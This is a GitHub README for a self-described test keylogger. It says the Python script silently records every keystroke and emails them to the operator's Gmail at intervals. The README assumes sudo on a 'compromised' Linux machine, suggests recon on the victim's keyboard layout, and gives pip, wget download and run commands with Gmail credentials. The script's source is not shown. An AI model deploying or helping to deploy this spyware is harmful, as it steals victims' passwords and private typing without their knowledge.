# Keylogger
Test keylogger, trash quality right now

## Description
Want a terrible keylogger? Look no further!

This keylogger runs in the background and copies all the keystrokes a user inputs. After an interval, it then emails these keystrokes to the gmail given.

### Prerequisites

This logger has been built on a number of assumptions:
* You've can run sudo on a comprimised linux system
* You have access to Gmail, and have turned on 'less secure app access' in your security settings

You'll need to install the following pip3 modules, if you don't already have them:
```bash
pip3 install keyboard
pip3 install argparse
```
### Installation
```bash
wget https://github.com/Purp1eW0lf/Keylogger/logger.py
```
### Usage
This logger requires you to feed your gmail email and password. I would create a throwaway account for this. 

You can also optionally feed the script the length of time you want it to wait and send you an email of the keystrokes. The default waiting period is 60 seconds, should you chooe not to input length
You'll need to install the following pip3 modules, if you don't already have them:
```bash
sudo python3 logger.py -e gmail@Address -p Password -l 120
```

### Known Issues
Sometimes the emails don't send at the regular interval, but will come in batch and you'll get a handful at once
* Fix: I'm not clever enough to figuire out why yet

The script tries to tranpose special characters by examining is the user presses the SHIFT key and a corresponding number. This is majorly flawed, however, as it is entirely keyboard dependent. It is therefore trash. The current script is based on a Macbook keyboard. 
* If you're able to do some recon on the user's keyboard, you can change the section mid-script and reassign the key values for better accuracy. 

### Contact

If you notice a way the script can be improved you're welcome to make requests and raise issues. 
You're also welcome to slide in my Twitter DMs and tell me how shit the logger is.
[@Purp1eW0lf](https://twitter.com/Purp1eW0lf)
